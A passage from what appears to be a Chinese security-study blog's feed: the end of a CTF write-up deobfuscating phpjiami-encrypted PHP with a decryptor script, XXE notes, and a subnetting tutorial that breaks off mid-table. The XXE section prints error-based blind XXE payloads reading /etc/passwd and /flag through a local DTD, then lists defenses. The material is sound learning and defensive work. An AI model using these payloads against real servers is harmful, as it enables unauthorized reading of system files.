class="line">$_v15, <span class="comment">// $_v15 = 'md5';</span></span><br><span class="line">$_v16, <span class="comment">// $_v16 = 'set_include_path';</span></span><br><span class="line">$_v17; <span class="comment">// $_v17 = 'dirname';</span></span><br><span class="line"><span class="comment">// 然后一堆变量等于 func2</span></span><br><span class="line"><span class="keyword">if</span> (!$_v1) &#123;</span><br><span class="line">    <span class="comment">// 使用 func2 用传递引用变量的方法赋值，简化之后如下</span></span><br><span class="line">    $_v1 = <span class="string">'file_get_contents'</span>;</span><br><span class="line">    $_v3 = <span class="string">'substr'</span>;</span><br><span class="line">    $_v6 = <span class="string">'unpack'</span>;</span><br><span class="line">    $_v10 = <span class="string">'gzuncompress'</span>;</span><br><span class="line">    $_v11 = <span class="string">'create_function'</span>;</span><br><span class="line">    $_v12 = <span class="string">'strpos'</span>;</span><br><span class="line">    $_v13 = <span class="string">'addslashes'</span>;</span><br><span class="line">    $_v14 = <span class="string">'str_rot13'</span>;</span><br><span class="line">    $_v15 = <span class="string">'md5'</span>;</span><br><span class="line">    $_v16 = <span class="string">'set_include_path'</span>;</span><br><span class="line">    $_v17 = <span class="string">'dirname'</span>;</span><br><span class="line">    $_v8 = <span class="string">'preg_replace'</span>;</span><br><span class="line">    $_v9 = <span class="string">'base64_encode'</span>;</span><br><span class="line">    $_v7 = <span class="string">'constant'</span>;</span><br><span class="line">    $_v5 = <span class="string">'assert_options'</span>;</span><br><span class="line">    $_v4 = <span class="string">'assert'</span>;</span><br><span class="line">    $_v2 = <span class="string">'chr'</span>;</span><br><span class="line">    $v1 = <span class="string">'rand'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 一堆变量等于 func4，然后用 func4 解码</span></span><br><span class="line">$v2 = <span class="string">'_f_'</span>;</span><br><span class="line">$v3 = func3($&#123;$v2&#125;);</span><br><span class="line"><span class="comment">// $_v16($_v17($&#123;$v2&#125;));</span></span><br><span class="line">set_include_path(dirname($&#123;$v2&#125;));</span><br><span class="line"><span class="comment">// $v4 = $_v9($v3);</span></span><br><span class="line">$v4 = base64_encode($v3);</span><br><span class="line"><span class="comment">// $v5 = func4('??????');</span></span><br><span class="line"><span class="comment">// 解密之后的原文不是 $v4，这里是翻译之后的</span></span><br><span class="line">$v5 = <span class="string">'eval(base64_decode($v4));'</span>;</span><br><span class="line"><span class="comment">// $v5 = $_v8(func4('??????'), $v5, func4('??????'));</span></span><br><span class="line"><span class="comment">// mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span></span><br><span class="line"><span class="comment">// PCRE 修饰符 e (PREG_REPLACE_EVAL)</span></span><br><span class="line"><span class="comment">// Warning: This feature was DEPRECATED in PHP 5.5.0, and REMOVED as of PHP 7.0.0.</span></span><br><span class="line"><span class="comment">// If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string. Single quotes, double quotes, backslashes (\) and NULL chars will be escaped by backslashes in substituted backreferences.</span></span><br><span class="line"><span class="comment">// 换句话说 preg_replace 如果带 e 的话，第一步，正常地进行正则表达式替换（反向引用也会被正常替换，就是完全正常的正则替换），第二步，把结果 eval 作为最终结果</span></span><br><span class="line"><span class="comment">// 简而言之 $v5 = eval($v5);</span></span><br><span class="line">$v5 = preg_replace(<span class="string">'/0dcaf9/e'</span>, $v5, <span class="string">'0dcaf9'</span>);</span><br><span class="line"><span class="comment">// 把上述几步统一一下 $v5 = eval(func3($_f_));</span></span><br><span class="line"><span class="comment">// $_v16($_v17($&#123;$v2&#125;));</span></span><br><span class="line">set_include_path(dirname($&#123;$v2&#125;));</span><br><span class="line"><span class="comment">// 把解码之后的文件运行结果返回</span></span><br><span class="line"><span class="keyword">return</span> $v5;</span><br></pre></td></tr></table></figure></div><h3 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data_1 = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $ch = ord($data[$i]);</span><br><span class="line">        <span class="keyword">if</span> ($ch &lt; <span class="number">245</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($ch &gt; <span class="number">136</span>) &#123;</span><br><span class="line">                $data_1 .= chr($ch / <span class="number">2</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $data_1 .= $data[$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_1 = base64_decode($data_1);</span><br><span class="line">    $key = md5($key);</span><br><span class="line">    $j = $ctrmax = <span class="number">32</span>;</span><br><span class="line">    $data_2 = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($data_1); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($j &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            $j = $ctrmax;</span><br><span class="line">        &#125;</span><br><span class="line">        $j--;</span><br><span class="line">        $data_2 .=  $data_1[$i] ^ $key[$j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $data_2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_data</span><span class="params">($code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $code_end = strrpos($code, <span class="string">'?&gt;'</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$code_end) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_start = $code_end + <span class="number">2</span>;</span><br><span class="line">    $data = substr($code, $data_start, <span class="number">-46</span>);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_key</span><span class="params">($code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $v1 = $v2('bWQ1');</span></span><br><span class="line">    <span class="comment">// $key1 = $v1('??????');</span></span><br><span class="line">    $pos1 = strpos($code, <span class="string">"('"</span> . preg_quote(base64_encode(<span class="string">'md5'</span>)) . <span class="string">"');"</span>);</span><br><span class="line">    $pos2 = strrpos(substr($code, <span class="number">0</span>, $pos1), <span class="string">'$'</span>);</span><br><span class="line">    $pos3 = strrpos(substr($code, <span class="number">0</span>, $pos2), <span class="string">'$'</span>);</span><br><span class="line">    $var_name = substr($code, $pos3, $pos2 - $pos3 - <span class="number">1</span>);</span><br><span class="line">    $pos4 = strpos($code, $var_name, $pos1);</span><br><span class="line">    $pos5 = strpos($code, <span class="string">"('"</span>, $pos4);</span><br><span class="line">    $pos6 = strpos($code, <span class="string">"')"</span>, $pos4);</span><br><span class="line">    $key = substr($code, $pos5 + <span class="number">2</span>, $pos6 - $pos5 - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> $key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$input_file = $argv[<span class="number">1</span>];</span><br><span class="line">$output_file = $argv[<span class="number">1</span>] . <span class="string">'.decrypted.php'</span>;</span><br><span class="line"></span><br><span class="line">$code = file_get_contents($input_file);</span><br><span class="line"></span><br><span class="line">$data = find_data($code);</span><br><span class="line"><span class="keyword">if</span> (!$code) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'未找到加密数据'</span>, PHP_EOL;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = find_key($code);</span><br><span class="line"><span class="keyword">if</span> (!$key) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'未找到秘钥'</span>, PHP_EOL;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$decrypted = decrypt($data, $key);</span><br><span class="line">$uncompressed = gzuncompress($decrypted);</span><br><span class="line"><span class="comment">// 由于可以不勾选代码压缩的选项，所以这里判断一下是否解压成功，解压失败就是没压缩</span></span><br><span class="line"><span class="keyword">if</span> ($uncompressed) &#123;</span><br><span class="line">    $decrypted = str_rot13($uncompressed);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $decrypted = str_rot13($decrypted);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($output_file, $decrypted);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'解密后文件已写入到 '</span>, $output_file, PHP_EOL;</span><br></pre></td></tr></table></figure></div><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>没什么好说的，<code>index.php</code> 提示存在 <code>UploadFile.class.php</code>，下载下来之后，发现关键函数，然后数组绕过就vans了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"> <span class="comment">// 用.分割文件名，只保留首尾两个字符串，防御Apache解析漏洞</span></span><br><span class="line">    $origin_name = current($filename);</span><br><span class="line">    $ext = end($filename);</span><br><span class="line">    $new_name = (<span class="keyword">$this</span>-&gt;new_name ? <span class="keyword">$this</span>-&gt;new_name : $origin_name) . <span class="string">'.'</span> . $ext;</span><br><span class="line">    $target_fullpath = <span class="keyword">$this</span>-&gt;dist_path . DIRECTORY_SEPARATOR . $new_name;</span><br></pre></td></tr></table></figure></div><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.virzz.com/2017/09/20/pwnhub_writeups_sha_fu_fu_workdays.html" target="_blank" rel="noopener">Virink师傅的题解</a><br><a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="noopener">p神的出题原理</a><br><a href="http://lovei.org/archives/pwnhub6669.html" target="_blank" rel="noopener">腹黑师傅的wp</a><br><a href="https://www.52pojie.cn/thread-693641-1-1.html" target="_blank" rel="noopener">Ganlv 师傅的解码思路</a><br><a href="https://www.colabug.com/2018/0209/2334241/" target="_blank" rel="noopener">某PHP加密文件解密过程初探</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="php" scheme="https://manayakko.github.io/yakko117/tags/php/"/>
    
      <category term="code audit" scheme="https://manayakko.github.io/yakko117/tags/code-audit/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞学习</title>
    <link href="https://manayakko.github.io/yakko117/2020/03/18/XXElearn/"/>
    <id>https://manayakko.github.io/yakko117/2020/03/18/XXElearn/</id>
    <published>2020-03-18T12:28:17.262Z</published>
    <updated>2020-03-20T02:06:00.373Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>最近莫名开始倒时差，每天下午5点多开始犯困，然后一睡就睡到了半夜起来<br>只会做题是不行的，要去学习原理，而不是纯粹做个脚本小子</p><a id="more"></a><h1 id="基础知识参考文档"><a href="#基础知识参考文档" class="headerlink" title="基础知识参考文档"></a>基础知识参考文档</h1><p><a href="https://www.tutorialspoint.com/dtd/dtd_entities.htm" target="_blank" rel="noopener">XML类型声明原文档</a><br><a href="https://www.cnblogs.com/zhaijiahui/p/9147595.html" target="_blank" rel="noopener">XXE漏洞学习</a><br><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">XXE漏洞利用技巧：从XML到远程代码执行</a><br><a href="https://zhuanlan.zhihu.com/p/88125925" target="_blank" rel="noopener">googleCTF2019关于xxe的题解</a><br><a href="https://blog.zsec.uk/blind-xxe-learning/" target="_blank" rel="noopener">盲注技巧</a><br><a href="https://xz.aliyun.com/t/6829" target="_blank" rel="noopener">PHP与JAVA之XXE漏洞详解与审计</a></p><h1 id="几个需要注意的点"><a href="#几个需要注意的点" class="headerlink" title="几个需要注意的点"></a>几个需要注意的点</h1><p>现在有<code>回显的XXE</code> 已经很少了,Blind-XXE重点在于如何将数据传输出来。</p><p>以往很多文章通过引入外部服务器或外部dtd文件,可以实现 <code>OOB(out-of-band)</code> 信息传递和通过构造dtd从错误信息获取数据。</p><h2 id="记得改"><a href="#记得改" class="headerlink" title="记得改"></a>记得改</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-type</span>: application/xml</span><br></pre></td></tr></table></figure></div><h2 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/xml_1.png" data-fancybox="group" data-caption="pro" class="fancybox"><img alt="pro" title="pro" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/xml_1.png" class="lazyload"></a></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h2><p>如果目标主机的防火墙十分严格,不允许我们请求外网服务器dtd,那么我们可以通过引入本地dtd文件实现XXE。</p><p><font color="6495ED">ubuntu系统</font>自带 <code>/usr/share/yelp/dtd/docbookx.dtd</code> 文件</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div></div><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/yelp/dtd/docbookx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamso</span> <span class="meta-string">'</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;test&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">    '</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">message</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">para1</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">para</span> <span class="meta-string">'</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; para2 "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;para2;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">    '</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %para;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="symbol">&amp;id;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="使用开发语言提供的禁用外部实体的方法"><a href="#使用开发语言提供的禁用外部实体的方法" class="headerlink" title="使用开发语言提供的禁用外部实体的方法"></a>使用开发语言提供的禁用外部实体的方法</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure></div><h2 id="过滤关键词："><a href="#过滤关键词：" class="headerlink" title="过滤关键词："></a>过滤关键词：</h2><ul><li><code>&lt;!DOCTYPE</code> </li><li><code>&lt;!ENTITY</code></li><li><code>SYSTEM</code></li><li><code>PUBLIC</code></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近莫名开始倒时差，每天下午5点多开始犯困，然后一睡就睡到了半夜起来&lt;br&gt;只会做题是不行的，要去学习原理，而不是纯粹做个脚本小子&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="瞎扯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
      <category term="code audit" scheme="https://manayakko.github.io/yakko117/tags/code-audit/"/>
    
  </entry>
  
  <entry>
    <title>子网划分和子网掩码计算方法</title>
    <link href="https://manayakko.github.io/yakko117/2020/03/06/ip%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86/"/>
    <id>https://manayakko.github.io/yakko117/2020/03/06/ip%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86/</id>
    <published>2020-03-06T11:09:27.985Z</published>
    <updated>2020-03-06T11:46:52.881Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h1><p><code>子网划分</code> 是通过借用IP地址中若干位主机地址来充当子网的网络地址，从而将原网络划分为若干子网。</p><h2 id="为什么划分子网"><a href="#为什么划分子网" class="headerlink" title="为什么划分子网"></a>为什么划分子网</h2><ul><li>IP地址空间的利用率有时候不高</li></ul><p>举个例子：在A类IP地址中，每个A类网络可能有16777214台主机，它们处于同一广播域。在同一广播域中有这么多主机是不可能的，网络会因为广播通信而饱和，因此要划分子网减少不必要的网络流量 <code>(优化网络性能)</code>。</p><ul><li>两级IP地址不够灵活</li></ul><p>IP地址资源越来越少，WAN链路比LAN链路的速度慢得多，且更昂贵;如果纯粹用大跨度的大型网络，进行流量数据交互，利用率不高。<br>因此为实现更小的广播域 <code>(提高系统效率)</code>，就需要进一步分成更小的网络。划分子网后，通过使用掩码，把子网隐藏起来，使得从外部看网络没有变化，这就是子网掩码。</p><p>当某个单位划分子网后，对外仍然 <code>表现为一个网络</code> ，除本单位之外的网络看不见本单位的子网划分。</p><h2 id="子网分类"><a href="#子网分类" class="headerlink" title="子网分类"></a>子网分类</h2><p>划分子网时，随着子网地址借用主机位数的增多，子网的数目随之增加，但每个子网中的可用主机数逐渐减少。<br>如 <code>C类地址</code>，原有8位主机位，$2^8$-2即254个主机地址，默认子网掩码255.255.255.0。(全0或全1不可用）<br>借用1位主机位，产生$2^1$=2个子网，每个子网有$2^7$个主机地址;<br>借用2位主机位，产生$2^2$=4个子网，每个子网有$2^6$个主机地址;<br>…<br>具体如下图<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gcmq2fwftij318d0iddi8.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gcmq2fwftij318d0iddi8.jpg" class="lazyload"></a></p><h2 id="明确子网划分的需求"><a href="#明确子网划分的需求" class="headerlink" title="明确子网划分的需求"></a>明确子网划分的需求</h2><ul><li><p>确定需要的网络ID数:</p><ul><li>每个LAN子网一个;</li><li>每条广域网连接一个。</li></ul></li><li><p>确定每个子网所需的主机数:</p><ul><li>每个TCP/IP主机一个;</li><li>每个路由器接口一个。</li></ul></li><li><p>需要一个用于整个网络的子网掩码;</p><ul><li>每个物理网段的唯一子网ID;</li><li>每个子网的主机范围。</li></ul></li></ul><hr><h1 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h1><h2 id="概述及作用"><a href="#概述及作用" class="headerlink" title="概述及作用"></a>概述及作用</h2><ol><li>子网掩码是一个应用于TCP/IP网络的32位二进制值，每节8位，必须结合IP地址对应使用。</li><li>子网掩码32位都与IP地址32位对应，如果某位是<font color="6495ED">网络地址，则子网掩码为1，否则为0。</font></li><li>子网掩码可以通过与 <code>IP地址&quot;与&quot;计算</code>，分离出IP地址中的网络地址和主机地址，用于判断该IP地址是在局域网上，还是在广域网上。</li><li>子网掩码一般用于将网络进一步划分为若干子网，以避免主机过多而拥堵或过少而IP浪费。(上面也提到了)</li></ol><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gcmq2fv8ckj30pf0fy75p.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gcmq2fv8ckj30pf0fy75p.jpg" class="lazyload"></a></p><h2 id="为什么要使用子网掩码"><a href="#为什么要使用子网掩码" class="headerlink" title="为什么要使用子网掩码"></a>为什么要使用子网掩码</h2><p>子网掩码可以分离出IP地址中的网络地址和主机地址，那为什么要分离呢？因为两台计算机要通讯，首先要判断是否处于同一个广播域内，即网络地址是否相同。如果网络地址相同，表明接受方在本网络上，那么可以把数据包直接发送到目标主机，<font color="6495ED">否则就需要路由网关将数据包转发送到目的地。</font></p><hr><h2 id="子网掩码的分类"><a href="#子网掩码的分类" class="headerlink" title="子网掩码的分类"></a>子网掩码的分类</h2><h3 id="缺省子网掩码："><a href="#缺省子网掩码：" class="headerlink" title="缺省子网掩码："></a>缺省子网掩码：</h3><p>(未划分子网)<br>子网掩码32位与IP地址32位对应,如果某位是网络地址，则子网掩码为1，否则为0。<br>例如A类IP地址，第一节为网络地址，其余三节为主机地址<br>故掩码为<code>11111111.00000000.00000000.00000000</code></p><p><font color="6495ED">A类网络</font> 缺省子网掩码：<code>255.0.0.0</code><br><font color="6495ED">B类网络</font> 缺省子网掩码：<code>255.255.0.0</code><br><font color="6495ED">C类网络</font> 缺省子网掩码：<code>255.255.255.0</code></p><h3 id="自定义子网掩码："><a href="#自定义子网掩码：" class="headerlink" title="自定义子网掩码："></a>自定义子网掩码：</h3><p>将一个网络划分为若干子网，希望每个子网拥有不同的网络地址或子网地址。因为ＩＰ是有限的，实际上我们是将主机地址分为两个部分：子网网络地址、子网主机地址。形式如下：<br>未做子网划分的ip地址：<strong>网络地址＋主机地址</strong><br>做子网划分后的ip地址：<strong>网络地址＋（子网网络地址＋子网主机地址）</strong></p><h3 id="子网掩码和ip地址的关系"><a href="#子网掩码和ip地址的关系" class="headerlink" title="子网掩码和ip地址的关系"></a>子网掩码和ip地址的关系</h3><p>设IP地址为192.168.10.2，子网掩码为255.255.255.240，那么子网掩码是怎样来区分网络地址和主机地址的呢。</p><p>主机地址为：0.0.0.2（将掩码取反，然后与IP地址进行与运算）</p><p><font color="6495ED">与运算</font>:对应位全是 <code>1</code> 结果为 <code>1</code> ,否则为 <code>0</code><br><font color="6495ED">或运算</font>:对应位全是 <code>0</code> 结果为 <code>0</code>, 否则为 <code>1</code></p><hr><h1 id="子网掩码习题"><a href="#子网掩码习题" class="headerlink" title="子网掩码习题"></a>子网掩码习题</h1><h2 id="例-1"><a href="#例-1" class="headerlink" title="例 1"></a>例 1</h2><p><strong>已知IP地址是 <code>141.14.72.24</code>， 子网掩码是 <code>255.255.192.0</code> 求网络地址</strong></p><h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>首先通过子网掩码和IP地址进行与运算，可以推断网络地址为 <code>141.14.xx.0</code></p><p>然后只需要知道 <code>72</code> 和 <code>192</code> 的二进制<br>首先 <code>72</code> = <code>0100 1000</code><br>然后 <code>192</code>= <code>1100 0000</code><br>进行与运算可以得到 <code>0100 0000</code> = <code>64</code></p><p>同时可以知道 <code>1100 0000</code> 子网号占了 <code>2</code> 个位，剩下14（6+8）位为主机号，即有 $2^{14}$ 个主机</p><p>主机号全 <code>0</code> 表示这个网络段本身称之为: <code>网络号</code><br>主机号全 <code>1</code> 的地址称之为: <code>广播地址</code></p><p>然后写个表，用来记一下常规数据的二进制<br>|二进制|十进制|<br>|:—-:|—:|<br>|1000 0000|128|<br>|1100 